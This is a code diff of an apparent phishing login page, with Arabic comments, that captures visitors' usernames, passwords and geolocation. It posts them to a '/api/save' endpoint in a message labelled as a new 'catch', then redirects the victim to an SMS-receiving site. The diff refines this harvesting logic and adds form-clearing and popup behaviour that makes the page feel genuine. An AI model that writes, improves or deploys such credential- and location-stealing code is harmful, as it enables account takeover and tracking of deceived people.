@@ -143,14 +143,15 @@
         const hasArabic = /[\u0600-\u06FF]/.test(user);
 
         if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
+            // طلب إذن الموقع الجغرافي عند إرسال البيانات
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // تم إصلاح الرابط هنا (إزالة الرقم 1 الزائد وإضافة الأقواس الصحيحة)
-                        const loc = "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude;
+                        const loc = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                         processCapture(user, pass, loc);
                     },
                     () => {
+                        // في حال رفض الإذن، يتم الإرسال بدون الموقع
                         processCapture(user, pass, "تم رفض الوصول للموقع");
                     }
                 );
@@ -171,6 +172,10 @@
                     confirmButtonColor: '#22d3ee',
                     allowOutsideClick: false,
                     customClass: { popup: 'glass-popup' }
+                }).then(() => {
+                    document.getElementById('user').value = '';
+                    document.getElementById('pass').value = '';
+                    document.getElementById('user').focus();
                 });
             }
         }
@@ -196,23 +201,25 @@
                 overlay.style.display = 'none';
                 localStorage.removeItem('lock_expiry');
                 loginAttempts = 0;
+                Swal.fire({
+                    title: 'مبروك!',
+                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
+                    icon: 'success',
+                    confirmButtonColor: '#22d3ee',
+                    customClass: { popup: 'glass-popup' }
+                });
             }
         }, 1000);
     }
 
     async function processCapture(u, p, location) {
-        // التنسيق المرتب للرسالة
-        let fullMessage = "🎯 صيد جديد جاهز:\n\n";
-        fullMessage += "👤 المستخدم: " + u + "\n";
-        fullMessage += "🔑 كلمة المرور: " + p + "\n";
-        fullMessage += "📍 الموقع: " + location + "\n\n";
-        fullMessage += "👤 @M6_vip";
-
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: fullMessage })
+                body: JSON.stringify({ 
+                    message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location}` 
+                })
             });
             window.location.href = "https://receive-smss.com/";
         } catch (err) {}
